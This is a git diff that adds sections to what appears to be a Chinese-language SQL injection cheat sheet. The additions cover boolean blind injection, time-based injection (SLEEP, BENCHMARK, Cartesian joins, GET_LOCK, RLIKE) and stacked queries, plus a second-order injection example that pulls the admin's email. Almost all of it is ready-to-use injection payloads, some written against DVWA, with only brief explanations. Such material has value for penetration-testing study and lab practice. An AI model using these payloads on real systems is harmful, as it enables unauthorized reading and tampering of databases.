@@ -226,3 +226,58 @@ update users set password='Peter' or !(select*from(select user())x)-~0 or '' whe
 
 delete from users where id='1' or !(select*from(select user())x)-~0 or '';
 ```
+
+盲注：
+```sql
+布尔
+1' and left(database(),4)='dvwa' --+
+1' and mid(database(),1,1)='d' --+
+1' and ascii(mid(database(),1,1))='100'--+
+1' and length(database())>=5--+判断库名长度
+1' and substr(database(),1,1)='d'--+ 截取库名第一个字符
+1 and 1=(if((user() regexp '^r'),1,0)) --+
+1 and 1=(user() like 'r%25') --+
+```
+
+延迟注入：
+```sql
+SLEEP函数
+1' and if(length(database())>=4,sleep(5),1)--+
+1' and if(ascii(mid(database(),1,1))='100',sleep(5),1)--+
+
+BENCHMARK
+Select * from users where user_id= 1 and (if(ascii(substr(database(),1,1))=100,benchmark(100000000,sha(1)), null));
+
+笛卡尔积
+将两个大表做乘积。现在，我们有两个集合A和B。
+A = {0,1}     B = {2,3,4}
+集合 A×B 和 B×A的结果集就可以分别表示为以下这种形式：
+A×B = {（0，2），（1，2），（0，3），（1，3），（0，4），（1，4）}；
+B×A = {（2，0），（2，1），（3，0），（3，1），（4，0），（4，1）}；
+数据库表连接数据行匹配时所遵循的算法就是以上提到的笛卡尔积，表与表之间的连接可以看成是在做乘法运算
+select * from guestbook join users
+
+Get_lock
+Select GET_LOCK('snowwolf',10)
+
+Rlike
+select concat (rpad (1,999999,a),rpad (1,999999,a),rpad(1,999999,a) ,rpad(1,999999,a)
+,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a)
+,rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rpad(1,999999,a),rp
+ad(1,999999,a) ,rpad (1,999999,a),rpad(1,999999,a),rpad(1,999999,a )) RLIKE '(a.*)+(a.*)+
+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b';
+```
+
+堆叠查询：
+```sql
+;select
+```
+
+二阶注入：
+```sql
+注册或更新个人资料如下
+I love programming', email=(SELECT email FROM users WHERE username='admin') --
+当执行SQL语句时，会发生以下情况：
+> + 末尾的注释--可确保原始 SQL 查询的其余部分被注释掉。
+> + 子查询(SELECT email FROM users WHERE username='admin')预计将执行并email用管理员用户的电子邮件替换该列。
+```
